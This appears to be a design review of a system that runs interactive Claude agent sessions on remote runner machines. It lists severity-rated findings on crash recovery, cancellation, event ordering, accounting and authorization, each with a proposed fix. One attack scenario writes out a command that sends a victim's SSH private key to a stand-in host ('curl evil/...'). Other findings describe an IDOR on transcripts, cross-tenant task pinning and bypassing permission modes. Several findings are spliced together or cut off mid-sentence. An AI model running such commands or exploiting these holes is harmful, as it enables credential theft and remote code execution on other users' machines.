  - fix: Update TasksService.cancel (and the new /end fallback) to select the live run by status IN ('RUNNING','AWAITING_INPUT') for interactive tasks. Always call requestCancel(run.runnerId, run.id) when a non-terminal run exists, regardless of RUNNING vs AWAITING_INPUT. Also ensure the runner's cancel handler (heartbeat cancelRunIds) tears down a parked/AWAITING_INPUT session (closes stdin/kills process), not just an actively-streaming one - today active map holds a per-turn cancel func; for a parked session there must still be a session-scoped cancel registered.
- **[high] (failure-recovery)** Cancellation is a fire-and-forget in-memory signal with no durability and no retry. It is high-latency (heartbeat-coupled) and non-idempotent across restart. For interactive sessions that hold a long-lived process this turns into a guaranteed resource leak whenever a restart races a cancel.
  - scenario: Cancel latency up to 30s + cancel signal lost on server restart, leaving a zombie session. requestCancel writes only to an in-memory Map (realtime.service.ts:26-33) drained exclusively by the next 30s heartbeat (runloop.go:30-56, heartbeatInterval=30s). For an interactive 'Stop'/'End' the user expects sub-second teardown but waits up to 30s. Worse: user clicks End -> requestCancel adds runId to the Map -> apiserver restarts before the next heartbeat -> the Map is gone (in-memory) -> the cancellation is permanently lost. The runner never receives it; the claude process and inbox poll live on; the run was perhaps already flipped CANCELLED in DB. Zombie session pinning a MaxConcurrent slot, never reaped (no reaper exists).
  - fix: Persist the cancel/end intent durably (e.g. a ConversationTurn{kind:'end'} or a cancelRequestedAt column on TaskRun) rather than only the in-memory Map, and have the inbox long-poll deliver it with sub-50ms latency (the design's own fast path) instead of waiting for heartbeat. On runner reconnect/reclaim, re-read the durable cancel intent and tear down. Keep the heartbeat Map only as a redundant fast hint, never as the source of truth.
- **[high] (failure-recovery)** The history->live handoff is not atomic; there is a publish-during-handoff gap. The frontend dedup-by-seq tolerates duplicates but cannot recover a seq it never received. Frequent interactive reconnects make this a recurring correctness bug, not a one-time startup edge.
  - scenario: SSE history-then-live gap loses events emitted during the snapshot window - amplified for long-lived interactive runs. runs.controller.ts:37 does concat(history$, live$) where history$ is a Prisma findMany snapshot and live$ subscribes to the hub. RxJS subscribes to history$ FIRST and only subscribes to live$ after history completes. Any event the runner POSTs (runner-api.controller.ts:254 realtime.publish) AFTER the findMany query ran but BEFORE the SSE has drained history and subscribed to the hub is published to a Subject with no subscriber for this run and is lost from the live stream (it is in the DB, but the client already passed it in history). For one-shot this is a brief startup window; for interactive the client reconnects repeatedly over a long session (design 5.7 reconnect+backoff), and EACH reconnect reopens this race during active token streaming. Lost text_delta/tool_use events leave permanent gaps the dedup-by-seq Set cannot heal (it dedups, it never refetches).
  - fix: Close the gap with overlap + seq-based reconciliation: subscribe to live$ FIRST (buffer it), then read history, then merge and dedup by seq, dropping live events with seq <= max(history seq). Equivalently, implement SSE Last-Event-ID / resume-from-seq (design defers this to Phase 6) and have reconnect send the last seq so the server replays DB rows > lastSeq before going live. For interactive this should be v1, not deferred, because reconnect frequency makes the race common.
- **[high] (failure-recovery)** Two competing session identifiers (server-generated sessionUuid vs scraped claudeSessionId) with the recovery path keyed on the one that is populated late and unreliably. The whole 'spawn before turn 1 so recovery works even before output' benefit of sessionUuid is discarded by keying --resume on claudeSessionId.
  - scenario: claudeSessionId race makes crash-recovery fail for a process that crashes before its first system/init event reaches the DB. Today claudeSessionId is only persisted at /complete (runner-api.controller.ts:275). The design moves persistence to 'first sighting in a system event' via the events ingest path (design 4, 'persist claudeSessionId when it first appears'). But the design ALSO introduces --session-id <serverUuid> known before turn 1 (design 2, 'strictly better than scraping session_id'). These two recovery keys are inconsistent: reclaim/respawn uses --resume <claudeSessionId> (design 3.2 'now WRITTEN mid-run', 4 reclaim 'respawn with --resume <claudeSessionId>') which is null until the first init event is ingested. If the claude process crashes on turn 1 before emitting/flushing the init system event (or the events batch carrying it is in-flight and lost on a runner crash), claudeSessionId is null in the DB. On runner restart, reclaim returns the run but with no resume key; respawn cannot --resume and either starts a fresh contextless session or fails.
  - fix: Key all recovery on the server-generated sessionUuid: spawn with --session-id <Task.sessionUuid>, and on reclaim/crash-respawn use --resume <Task.sessionUuid> (which equals the session id you pinned), never the scraped claudeSessionId. Persist sessionUuid at Task creation (it already is, per design 3.2). Treat the scraped session_id only as a verification/observability field. This removes the null-resume-key window entirely. Phase 0 must verify --resume of a --session-id-pinned session that crashed on turn 1 actually restores context.
- **[high] (failure-recovery)** The accounting model is absolute-assignment and single-shot, fundamentally incompatible with per-turn accumulation. Mixing the existing overwrite-on-complete with new increment-on-turn-complete corrupts totals; non-idempotent retries double-count. This is a data-integrity failure under perfectly normal multi-turn operation, worsened by retries after partitions.
  - scenario: Per-turn accounting overwrites instead of accumulating, corrupting cost/token/turn totals across a multi-turn session, and turn-complete vs complete double-counts. The existing complete() handler does prisma.taskRun.update with absolute assignments: numTurns: dto.numTurns ?? 0, costUsd: dto.costUsd ?? 0, sumInputTokens: usage?.input_tokens ?? 0, etc (runner-api.controller.ts:268-284). The design adds POST /turn-complete that must 'increment TaskRun.sum*/numTurns/costUsd' (design 4). If turn-complete reuses the same update shape, each turn OVERWRITES totals with that turn's numbers, so the session shows only the last turn's cost. If instead /complete still fires at teardown carrying a final result, it will overwrite the accumulated turn-complete totals with whatever the teardown payload has (likely 0 or the last result), wiping the running total. Also: if a turn-complete batch is retried after a network blip (transport.go retries are not idempotent), increments double-count.
  - fix: Make accounting idempotent and additive: turn-complete increments {numTurns: {increment: 1}, costUsd: {increment: turnCost}, sum*: {increment: ...}} keyed by turnId, and is a no-op if that turnId is already ANSWERED (dedup for retries). The teardown /complete for interactive must NOT re-assign totals - it should only stamp terminal status/finishedAt and leave the accumulated sums untouched (gate this on interactive, since one-shot still wants absolute assignment). Add a unique guard (turnId) so a retried turn-complete cannot double-increment.
- **[high] (failure-recovery)** Session-scoped seq is not durable across process/runner restart, but the uniqueness+dedup contract assumes a single monotonic sequence for the run's whole lifetime. skipDuplicates turns the collision into silent event loss rather than an error, so the corruption is invisible.
  - scenario: seq monotonicity breaks across a crash-respawn because the runner's session-scoped seq counter resets to 0 on respawn. The design hoists the seq counter to Session scope (runloop.go executeAndReport seq:=0 -> Session field) and relies on it staying monotonic for the whole session to satisfy @@unique([runId,seq]) (schema.prisma:214) and client dedup-by-seq. On a process crash the design respawns claude --resume up to N times (design 2 crash & restart recovery) emitting system{resumed}. But a respawn creates a NEW Session struct (or must), and if its seq counter restarts at 0, the new events collide with already-persisted seqs: runner-api events ingest uses createMany({skipDuplicates:true}) (runner-api.controller.ts:231-240), so the colliding post-respawn events are SILENTLY DROPPED (skipDuplicates), and they never appear in the transcript or SSE. The user sees the session resume but the first N events after recovery vanish. On runner RESTART + reclaim the same thing happens, guaranteed, because a freshly started runner process has no memory of the prior seq high-water mark.
  - fix: Persist the seq high-water mark per run server-side and have the runner resume seq from it on respawn/reclaim. Concretely: reclaim and/or a 'session resume' endpoint returns the current MAX(RunEvent.seq) for the run; the respawned Session initializes its counter to that+1. Alternatively switch RunEvent.seq to a server-assigned monotonic value (server stamps seq on ingest, ordered per-run) so the runner need not coordinate - but that changes the dedup contract. At minimum, do NOT rely on skipDuplicates to mask collisions; detect a seq regression and refetch the high-water mark.
- **[high] (failure-recovery)** Recovery via reclaim assumes runner identity is stable across restart, but the enrollment design can mint a new runner.id on re-register. Runs are pinned to the old id, so reclaim, inbox ownership, and cancel all silently target nothing.
  - scenario: Reclaim ownership breaks when a runner re-enrolls under a changed identity, orphaning its live interactive runs. assertOwnership keys strictly on run.runnerId === runner.id (runner-api.controller.ts:319-325) and reclaim is described as 'returns THIS runner's RUNNING/AWAITING_INPUT interactive runs' (design 4). But approveDeviceEnrollment only reuses the existing runner row when the NAME matches (runners.service.ts:101-107); if a host re-registers with a different name (or via the register-token path which ALWAYS creates a new runner row, runner-api.controller.ts:66), it gets a NEW runner.id. After a host reboot + re-enroll under a new id, GET /reclaim for the new id returns nothing (the live runs belong to the old runnerId), and the old runner is offline forever. The interactive run is permanently orphaned in AWAITING_INPUT with no runner polling its inbox - and with no reaper (finding above) it never terminates.
  - fix: Either (a) guarantee stable runner identity across re-enrollment for the same host (reuse the runner row by a stable host key, not just name), or (b) on re-enroll, transfer in-flight non-terminal interactive runs from the prior runner row of the same owner+host to the new runner.id (re-point runnerId), or (c) have the reaper force-fail runs whose runner has been offline > window so an orphaned run at least terminates cleanly and the user can start a fresh session. Reclaim must also handle 'run was claimed by a runner id that no longer heartbeats'.
- **[medium] (failure-recovery)** During a partition the server cannot distinguish 'runner dead' from 'runner alive but unreachable'. The design's only liveness signal is the heartbeat; a runner mid-turn behind a partition will be declared dead and reaped even though it is healthy, and conversely a frozen UI gives the user no signal. Buffered-event replay after heal must be idempotent or it corrupts the transcript.
  - scenario: Network partition between runner and server during an active turn produces a phantom 'streaming' UI with no terminal event. The runner is feeding stdin and emitting deltas; the network drops. postEvents (transport.go:116, 35s timeout) fails; the design's interactive flush is 250ms but buffered events accumulate. The claude process keeps running locally and may emit the per-turn 'result'. The runner buffers turn_end + tries POST /turn-complete, which also fails during the partition. From the server/browser side: no events arrive, the run stays RUNNING (mid-turn), no terminal STATUS (design 6.3 'only /complete on teardown'), SSE shows a frozen spinner. If the partition lasts > buffer growth, events may be dropped if the runner caps the buffer. When the partition heals, the runner replays buffered events, but turn_end/turn-complete idempotency must hold or the turn double-completes. If the partition outlasts the heartbeat-offline window, the server (with the reaper fix) would force-fail the run while the runner actually completed the turn fine - a false failure.
  - fix: (1) Make event POST and turn-complete idempotent (seq dedup already gives event idempotency via skipDuplicates once the seq-persistence fix lands; turn-complete idempotent by turnId per earlier fix). (2) Surface partition state to the UI: when the runner's heartbeat goes stale but the run is non-terminal, emit a 'connection lost' status event (or the frontend already polls runner.online every 15s - show an offline banner and disable the composer) rather than a frozen spinner. (3) Tune the reaper grace window to be safely longer than the worst-case partition+buffer-replay so a healthy-but-partitioned runner that reconnects is not falsely failed; on reconnect the runner should re-assert RUNNING and resume posting.
- **[medium] (failure-recovery)** The lifecycle assumes stdin EOF reliably terminates claude and that stdin writes reliably reach a live process. A hung/zombie process (write EPIPE, or ignores EOF) has no escalation path, leaking the slot and silently dropping turns. The runner-side idle reaper depends on a clean exit that a hung process won't give.
  - scenario: Zombie claude process on stdin-write failure: stdin pipe broken but process not reaped. The design feeds turns by writing a JSONL line to cmd.StdinPipe() under a mutex. If the claude process has exited/hung but cmd.Wait() hasn't been observed yet (e.g. the process is a defunct zombie, or hung in an uninterruptible state), the stdin Write returns EPIPE/short write. The design's interrupt fallback is SIGINT/kill+respawn, but a plain turn-feed write failure has no defined handler. If the runner treats the write error as transient and re-arms the inbox, the turn is marked DELIVERED (lost per finding 1) and the user's message goes nowhere while the run still appears AWAITING_INPUT. Also: the runner's idle timer 'closes stdin (clean EOF) -> process exits -> cmd.Wait()'; if the process ignores stdin EOF (claude bug/hang), cmd.Wait never returns, the idle reap never completes, /complete never fires, and the MaxConcurrent slot leaks until the runner restarts.
  - fix: On any stdin write error, treat the session as dead: do NOT ack/consume the turn (leave it PENDING for redelivery to a respawn), then SIGKILL + cmd.Wait with a timeout, then either respawn-with-resume or /complete FAILED. The idle reaper must escalate: close stdin, then if cmd.Wait does not return within a grace period (e.g. 10s), SIGKILL and force /complete. Pair this with the server-side reaper so even a fully wedged runner gets its run terminated server-side.
- **[medium] (failure-recovery)** There is no concurrency control on inbound turns relative to turn boundaries. Accepting a new message while a turn is mid-flight, plus an inbox that serves the next PENDING immediately, can feed claude a second user message before it finished the first, with undefined behavior. Multi-tab is an explicitly-cited scenario (design 3.3 'concurrent tabs').
  - scenario: Concurrent turns / double-send from two browser tabs (or a fast double-click) interleave on stdin and corrupt the conversation. ConversationTurn.seq orders delivery, but the inbox serves 'next PENDING' and the runner feeds it to stdin. If a user sends turn A, then before A's result the user (or a second tab) sends turn B while the run is RUNNING (not AWAITING_INPUT), the design's /turns only 'rejects if no RUNNING/AWAITING_INPUT run' - it accepts B during RUNNING. Now there are two PENDING turns. The inbox could deliver B to the runner mid-turn-A; the runner writes B to stdin while claude is still producing A's turn, which claude may interpret as a queued message, an interrupt, or a protocol error depending on the binary's stream-json semantics (unverified). Best case turns get reordered/merged; worst case the stream-json parser desyncs and the session wedges.
  - fix: Gate delivery on turn boundaries: the inbox should only release a 'message' turn when the run is in AWAITING_INPUT (or the runner only pulls the next message after emitting turn_end), so messages are strictly serialized per turn. Messages sent during RUNNING are queued PENDING and delivered after the current turn completes (or routed to the interrupt path explicitly). Decide and verify (Phase 0) claude's behavior for a stdin user message arriving mid-turn; until verified, never feed a plain message mid-turn. For double-send dedup, consider a client-supplied idempotency key on /turns.
- **[critical] (security-and-authz)** IDOR on the SSE transcript: GET /runs/:id/events and GET /runs/:id (runs.controller.ts) are guarded only by JwtAuthGuard with NO ownerId scoping — the query is `taskRun.findUnique({ where: { id } })` / `runEvent.findMany({ where: { runId: id } })`. Any authenticated user can read ANY other user's full run transcript (assistant text, tool_use inputs, bash command output, file contents surfaced in tool_result) just by supplying another run's UUID. The design explicitly marks this endpoint 'unchanged' and reuses it as THE output channel for interactive sessions, so it inherits the IDOR — and interactive transcripts are richer/longer-lived (live shell output, secrets the agent reads from the target machine), making the leak worse.
  - scenario: User A opens an interactive session (runId R). User B (any logged-in account) calls GET /api/runs/R/events?access_token=<B's own JWT>. JwtAuthGuard passes (B has a valid token); there is no `where ownerId = B`. B receives A's entire live transcript including any `cat ~/.aws/credentials` tool_result B's prompt could not even have triggered. UUIDs leak via logs, referrer headers, or the /agents/:id/sessions/:runId routes the design adds to the URL bar.
  - fix: Scope the SSE and run-detail endpoints by owner before streaming: load the TaskRun joined to Task and assert `task.ownerId === req.user.userId` (throw ForbiddenException otherwise), mirroring TasksService.get's `where: { id, ownerId }`. Do this in RunsController.events and .get, and also gate the live$ subscription so it never starts for a non-owner. Add a regression test: user B requesting user A's run gets 403.
- **[critical] (security-and-authz)** Cross-tenant remote code execution via unvalidated assignedRunnerId. CreateTaskDto accepts `assignedRunnerId` as a free string (tasks.dto.ts:19) and tasks.service.create writes it verbatim with no check that the runner belongs to the caller. queue.service.tryClaim matches a task to a runner purely by `t."assignedRunnerId" = ${runner.id}` (queue.service.ts:59) with NO Task.owner == Runner.owner cross-check — the owner/label gating only applies in the `assignedRunnerId IS NULL` branch. So a task pinned to someone else's runner is claimed and executed on that runner. The design routes interactive session creation through this exact POST /tasks path ('Reuses TasksService.create ... enqueues'), turning it into an interactive, multi-turn arbitrary-command primitive on a victim's machine.
  - scenario: Attacker enumerates/guesses a victim's runner UUID, POSTs /api/tasks {interactive:true, title:'x', prompt:'run env; curl evil/$(cat ~/.ssh/id_rsa | base64)', assignedRunnerId:'<victim-runner-id>', enqueue:true}. The victim's runner long-poll claims it (assignedRunnerId matches), spawns claude on the victim's host, and now the attacker can keep sending stdin turns via POST /tasks/:id/turns to drive an interactive shell-capable agent on a machine they do not own.
  - fix: In tasks.service.create/update validate `assignedRunnerId` against `prisma.runner.findFirst({ where: { id, ownerId } })` and reject if not owned. Additionally harden queue.tryClaim: add `AND t."ownerId" = (SELECT ownerId FROM "Runner" WHERE id = ${runner.id})` to the assignedRunnerId branch so a runner can never claim a task whose owner differs from the runner's owner, defense-in-depth even if the DTO check is bypassed.
- **[high] (security-and-authz)** The 'permission-mode clamping to the owning Agent's policy ceiling' (design §7, billed as 'the strongest single security idea') is security theater because the Agent IS the user-controlled object. agents.dto.ts:26 validates permissionMode with @IsIn(PERMISSION_MODES) where PERMISSION_MODES includes 'bypassPermissions' (enums.ts:46 BYPASS). The owner can freely set their own Agent to permissionMode:'bypassPermissions' and allowedTools to anything. Clamping a per-turn override DOWN to an Agent ceiling the same user can raise to bypass provides no real ceiling. There is no operator/runner-owner-controlled policy layer above the Agent.
  - scenario: Owner creates Agent with permissionMode:'bypassPermissions' (passes @IsIn validation). Every interactive turn then runs with --permission-mode bypassPermissions on the runner host, no approval, no canUseTool round-trip (deferred in v1). The 'clamp' never triggers because the per-turn override is <= the ceiling. A compromised browser session for that owner inherits full bypass on the runner machine — exactly the outcome the clamp claims to prevent.
  - fix: Introduce a real policy ceiling that the requesting user cannot edit: a per-Runner (operator-set, runner-owner-set) `maxPermissionMode` / tool allowlist enforced server-side in buildJob, and clamp BOTH the Agent's mode and any per-turn override to it. Make `bypassPermissions` require an explicit, separately-authorized runner flag (not just enum membership). Until that exists, refuse to spawn interactive sessions in bypass/dontAsk on runners that have not opted in.
- **[high] (security-and-authz)** Long-lived JWT leaked in stream URL and query string. SSE auth uses `?access_token=<JWT>` (jwt-auth.guard.ts:20) and the JWT is a full 7-day access token (auth.module.ts:15 expiresIn:'7d') signed with secret defaulting to 'dev-secret' if JWT_SECRET unset. The design keeps this 'unavoidable and unchanged'. The gateway nginx (gateway/nginx.conf location /api/) does not turn off access_log, so nginx logs `$request` including the full `/api/runs/:id/events?access_token=<7d-JWT>`. - **[high] (concurrency-and-multitab)** DELIVERED is set optimistically at dequeue time, but HTTP long-poll delivery is not acknowledged. A dropped response = lost turn with no retry. The turn is now DELIVERED in Postgres but was never fed to claude. - **[high] (scaling-multiinstance)** The proposed server-side idle reaper (§2 'Server-side reaper', §8, §9 Phase 5: 'a server cron/interval injects an end inbox item for runs past idleDeadlineAt') has no execution substrate AND no multi-instance coordination. There is no @nestjs/schedule, no @Cron, no setInterval, and no leader election anywhere in the apiserver (verified: zero matches). With N replicas, if a naive setInterval reaper is added, all N run it concurrently.
  - scenario: Add a setInterval reaper to satisfy Phase 5. Run N=3 replicas. Every replica's interval fires near-simultaneously, each SELECTs runs past idleDeadlineAt and each inserts an 'end' ConversationTurn for the same run (3 duplicate end turns) and calls its own in-process notifyInbox (which, per finding #1, only wakes a poll if that poll happens to be on the same replica). Result: duplicate teardown turns, racing status writes (AWAITING_INPUT vs ending), and yet the actual wakeup still may not reach the parked poll. Defense-in-depth becomes a thundering-herd of triplicate writes that still fails to reliably tear down the wedged session it was meant to protect.
  - fix: Gate the reaper behind a single-leader mechanism: pg_advisory_lock (try-lock per tick; only the lock holder reaps) or a SELECT ... - **[medium] (scaling-multiinstance)** The frontend reconnect strategy (§5.7) plus DNS-round-robin gateway routing means SSE reconnections scatter across replicas, and the design's only correctness argument for reconnect ('SSE replays full history and the client dedups by seq, reconnection is idempotent') is true for correctness but ignores the cost amplification of full-history replay on every cross-replica reconnect for long-lived sessions.

- **[critical] (claude-process-hang-backpressure)** Synchronous inline flush on the stdout-reader goroutine couples server/network latency to Claude's stdout backpressure. Higher interactive output volume makes this far more likely than in the verified one-shot path. There is no decoupling buffer between 'drain Claude stdout' and 'POST to server'.
  - scenario: Output-flush backpressure deadlocks the stdout reader, which stalls the whole turn. In the current code (runloop.go:126-135) emit() is called from the single stdout-scanner goroutine (claude.go:96), and when the buffer reaches 25 events it calls flush() INLINE on that same goroutine. flush() calls t.postEvents synchronously with a 35s timeout (transport.go:117). The design RAISES output rate (--include-partial-messages + 250ms flush cadence + delta-heavy interactive turns) but keeps this synchronous inline-flush coupling. Concrete failure: Claude floods text_deltas during a large generation; the apiserver is briefly slow (DB write of RunEvent.createMany + per-event realtime.publish at runner-api.controller.ts:231-254 under load, or a GC pause, or the single-process hub having many SSE subscribers). postEvents blocks for up to 35s. While it blocks, the scanner goroutine is NOT draining Claude's stdout pipe. Claude's stdout OS pipe buffer (64KB) fills, Claude blocks on write(), and the turn freezes for up to 35s per flush, repeatedly. The user sees the turn 'hang' mid-stream with no error. With a 35s post timeout and repeated stalls, a single turn can wedge indefinitely.
  - fix: Decouple reading from posting. Run flush() on a dedicated sender goroutine fed by a bounded channel; the scanner goroutine must ONLY parse+enqueue and never block on HTTP. Use a bounded ring/channel (e.g. cap N events or M bytes) with an explicit overflow policy (drop text_deltas first, keep tool_use/tool_result/turn_end, emit a 'dropped K deltas' marker) so the reader keeps draining stdout even when the server is slow. Never call postEvents from the goroutine that reads cmd.Stdout.
- **[critical] (claude-process-hang-backpressure)** A blocking stdin write under a shared mutex makes interrupt undeliverable and can permanently wedge the session, defeating the very mid-turn-steer goal. The 10MB content cap is the wrong safety knob — the pipe buffer is ~64KB.
  - scenario: stdin write blocks forever and wedges the inbox-poll goroutine + the session. The design feeds each turn by writing one JSONL line to cmd.StdinPipe() under a mutex from the inbox-poll path. If Claude is mid-turn and not reading stdin (it only consumes the next user message at a turn boundary, and with --replay-user-messages it may also be busy), the stdin OS pipe buffer (~64KB) can fill when the user sends a large turn (near the 10MB cap) or rapid-fires turns/interrupts. The Go write() to stdin then BLOCKS while holding the stdin mutex. Now: (a) the interrupt path, which the design says ALSO writes to the same stdin under the same mutex, can never acquire the mutex — so 'Stop' is dead exactly when you need it; (b) the inbox-poll goroutine is stuck, so no further turns are read; (c) there is no write deadline on an os.Pipe (SetWriteDeadline is unsupported on pipes), so this blocks indefinitely.
  - fix: Do stdin writes on a dedicated writer goroutine fed by a channel, never inline under a lock shared with interrupt. Make interrupt use process SIGINT (the design's stated fallback) NOT a stdin write, so it cannot be blocked by a stuck message write. Guard each write with a timeout (write in a goroutine + select on a timer); on timeout, treat the session as wedged and SIGKILL+respawn-with-resume. - **[critical] (claude-process-hang-backpressure)** All reaping is keyed on conversational idleness (no inbox traffic) or turn boundaries, but the dangerous case is a turn that is ACTIVE-but-stuck. There is no per-turn wall-clock deadline and no hard-kill escalation when EOF is ignored.
  - scenario: A turn that never emits a 'result' parks the run as RUNNING forever with no reaper coverage. The design's idle reaper (runner 10min + server idleDeadlineAt) resets on each INBOX item (incoming user activity), not on turn progress. Failure: user sends one turn, Claude gets stuck (MCP tool hangs, network call to a tool never returns, infinite tool loop below max-turns, or model just stalls). No 'result' message is ever emitted, so the runner never POSTs turn-complete and never transitions to AWAITING_INPUT — the run stays RUNNING. The runner idle timer does NOT fire because it resets on inbox items and there was recent inbox activity (this very turn); even if it eventually fires, the design says it reaps by closing stdin for a CLEAN EOF, but a wedged Claude mid-turn won't act on stdin EOF. Net: a hung turn pins a MaxConcurrent slot and a live process indefinitely.

  - scenario: Per-turn cost/turn limits are unenforced for interactive sessions; --max-turns and --max-budget-usd are per-PROCESS, not per-conversation. executeJob passes --max-turns and --max-budget-usd (claude.go:48-53) from the Agent. A single interactive run is the conversation, and RunEvent stays the single transcript stream with a session-scoped monotonic seq.   - scenario: Rapid sends and concurrent tabs feed multiple queued turns back-to-back with no backpressure, flooding one process. The inbox long-poll drains them one at a time, but nothing limits how many a user (or two tabs, or a key-repeat) can enqueue.   - fix: Do not reuse MAX_SAFE_INTEGER for interactive. Persist turn boundaries as real seq'd RunEvent rows (the runner-owned counter the design already proposes for turn_end). - **[high] (data-consistency-and-ux)** Optimistic user bubbles and canonical replayed user events have no shared dedup key (seq-based Set won't catch the optimistic one), so duplicate or orphaned user bubbles appear, especially on reconnect or repeated identical messages.
  - scenario: Optimistic user bubble cannot be deduped against the canonical replayed event because they live in different id spaces. The design (§5.2) says: optimistically append a local user bubble, then reconcile when the canonical 'user' RunEvent arrives (via --replay-user-messages) 'match by turnId/content+pending flag'. But the SSE dedup is purely seq-based (TaskDetailPage.tsx:34-36, a Set<number>), and the optimistic bubble has no seq. So on the happy path you get a double-render until reconcile logic strips it; on reconnect/replay you re-receive the canonical 'user' event from DB history and, if the optimistic one is still pending, you now have two. Matching by content is unreliable (user sends the same message twice — 'retry', 'yes', 'continue' — a common interactive pattern). turnId only helps if the optimistic insert already knows the ConversationTurn id; but POST /tasks/:id/turns returns the turn, while the runner-emitted 'user' RunEvent payload must carry that exact turnId for matching, which the design hand-waves ('payload:{text,turnId}').
  - fix: Carry the server-generated ConversationTurn.id end-to-end: return it from POST /tasks/:id/turns, feed it to the runner via the inbox (RunInboxResponse.turnId), and require the runner to put it in the 'user' RunEvent payload. Dedup user bubbles by turnId, not content. On reconnect, reconcile the optimistic-by-turnId set against replayed turnIds and drop any optimistic bubble whose turnId now has a canonical event.
- **[high] (data-consistency-and-ux)** Durable persistence of the user's own turns is entirely contingent on an unverified CLI echo behavior; if absent, user messages exist only in volatile client state and vanish on reconnect/second-tab.
  - scenario: --replay-user-messages may not echo, leaving the user's own turn missing from the transcript on reconnect. The entire 'user appears in transcript' mechanism depends on the installed claude binary echoing each accepted stdin user message on stdout so the runner can emit a seq'd 'user' RunEvent. Phase 0 only verifies result/session-id/interrupt shapes, NOT that --replay-user-messages reliably echoes for the stdin-feed path. If it doesn't echo (or echoes a transformed/normalized form), the runner never emits a durable 'user' event. The optimistic bubble then lives only in that one browser tab's memory. A second tab, or the same tab after refresh/reconnect, replays history and sees Claude's answers with NO user prompts between them — an unreadable transcript.
  - fix: Do not depend on the CLI echo for durability. Have the SERVER persist the user turn as a RunEvent at enqueue time is unsafe (seq is runner-owned), so instead have the RUNNER emit the 'user' RunEvent itself the moment it pulls the turn from the inbox (it has the text + turnId + next session seq) — independent of --replay-user-messages. Add Phase-0 verification of echo behavior and make the runner-emitted user event the source of truth regardless.
- **[high] (data-consistency-and-ux)** The 'one runId for the whole conversation' invariant is not enforced anywhere; multiple TaskRun rows per interactive Task (crash respawn, reclaim, re-enqueue) silently repoint the UI to the wrong/empty run.
  - scenario: Stale latestRun selection picks the wrong run for a conversation, wiping or splitting the transcript. The design reuses the Task->runs[0] pattern. tasks.service.ts list/get order runs by createdAt desc and TaskDetailPage uses runs[0] as latestRun. With crash recovery (design §2: respawn / reclaim creates respawns) or any failed claim that creates a TaskRun, a single interactive Task can accumulate MULTIPLE TaskRun rows. If a second TaskRun is ever created (e.g., reclaim path, or a stale QUEUED re-claim, or operator re-enqueue), runs[0] flips to the new run id. AgentView subscribes to a 'single long-lived runId' but derives it from this list; the moment a new run appears, the stable-runId assumption breaks and either the transcript points at an empty new run or splits across two runs the UI never stitches.
  - fix: Make the invariant explicit: store the active interactive runId on the Task (e.g., Task.activeRunId) and have AgentView subscribe to THAT, never to runs[0]. On crash-recovery, respawn the SAME TaskRun (reuse runId, just --resume the claude session) rather than creating a new TaskRun, so RunEvent.seq stays one stream. If a new TaskRun is unavoidable, the UI must stitch transcripts across runIds explicitly.
- **[high] (data-consistency-and-ux)** Hard runner death mid-turn yields an indefinitely 'streaming' UI: no terminal/turn_end event, run stuck RUNNING, only a delayed offline banner that doesn't resolve the orphaned turn.
  - scenario: Runner-offline mid-turn leaves the UI streaming forever with no terminal event. runner.online is derived from heartbeat freshness (90s window, OFFLINE_AFTER_MS, runner-api.controller.ts:40,173). If the runner machine dies mid-turn (power loss / network partition), no /complete and no /turn-complete ever arrive. The run row stays RUNNING, the SSE stream stays open but silent, and AgentView (RUNNING => spinner + Stop) shows a perpetual spinner. The 15s ['runners'] poll will eventually flip runner.online=false after ~90s, but the design's offline handling is a banner + disabled composer — it does not reconcile the in-flight turn's status, so the last assistant turn appears truncated/unfinished with no error and the run never goes terminal.
  - fix: Couple turn lifecycle to liveness: when a runner crosses OFFLINE_AFTER_MS while it has a RUNNING interactive run, the server should mark that run FAILED (or AWAITING_INPUT with an injected error event) and publish a terminal/error RunEvent so the UI exits the streaming state. In AgentView, treat runner.online===false during a mid-turn (between user and turn_end) as a turn failure and surface it, don't just disable the composer.
- **[medium] (data-consistency-and-ux)** No interrupt-acknowledged event with defined ordering; interrupted partial assistant text is left in the transcript unmarked, and a Stop click racing turn completion can leak the interrupt into the next turn.
  - scenario: Interrupt has no acknowledgement event, so the Stop button has undefined UX and the transcript misrepresents what happened. The design's interrupt path writes a control_request to stdin (or SIGINT+resume fallback). On the fallback path the process is killed and respawned with --resume; in-flight assistant text already streamed to the browser stays in the transcript, but the model never actually finished/used it — the transcript now shows a half-answer with no marker that it was interrupted. There's also a race: user clicks Stop, but the turn's 'result' (turn_end) is already in flight; the interrupt ConversationTurn(kind:interrupt) gets delivered to a parked AWAITING_INPUT session and is either dropped or misapplied to the NEXT turn. The 'interrupt' RunEvent marker is mentioned but its emission timing vs. the abandoned text is unspecified.
  - fix: Emit an 'interrupt' RunEvent with a real seq AT the point the runner actually stops generation (after killing/steering), so the transcript clearly delimits abandoned output. Server-side, reject/no-op an interrupt ConversationTurn if the run is AWAITING_INPUT (nothing to interrupt) instead of queuing it for the next turn. In AgentView, disable Stop the moment turn_end arrives to close the race.
- **[medium] (data-consistency-and-ux)** Existing cancel() filters on status:'RUNNING' so it cannot stop an AWAITING_INPUT session, and complete()'s terminal Task-status mapping is incompatible with the new parked state — both are coexistence regressions.
  - scenario: One-shot coexistence regression: an interactive run that should park in AWAITING_INPUT will be force-completed by the existing cancel path, and TaskStatus mapping has no AWAITING_INPUT case. tasks.service.ts cancel() (line 109-122) finds the RUNNING TaskRun and requestCancel; but an interactive session that is parked is AWAITING_INPUT, not RUNNING — so the existing cancel query (status:'RUNNING') will MISS it and the End/cancel button silently does nothing for a parked session. Conversely complete()'s taskStatus mapping (runner-api.controller.ts:299-308) only maps SUCCEEDED/CANCELLED/else->FAILED; there is no handling for a run that completes a turn — if the interactive branch ever calls the shared complete() with a non-terminal intent it will flip Task to a terminal status and AgentView will show 'Session ended' prematurely.
  - fix: Update cancel() (and the new /end) to match status IN (RUNNING, AWAITING_INPUT). Ensure the interactive runner NEVER calls /complete on a turn boundary (only /turn-complete), and add an explicit guard/test that /complete is reached only on true teardown. Keep Task RUNNING for the whole interactive session as the design states, and verify no code path maps AWAITING_INPUT to a terminal TaskStatus.
- **[medium] (data-consistency-and-ux)** Full-history SSE replay on every reconnect is O(all events) and unbounded for long-lived sessions, made worse by partial-message deltas; reconnects become slow and memory-heavy.
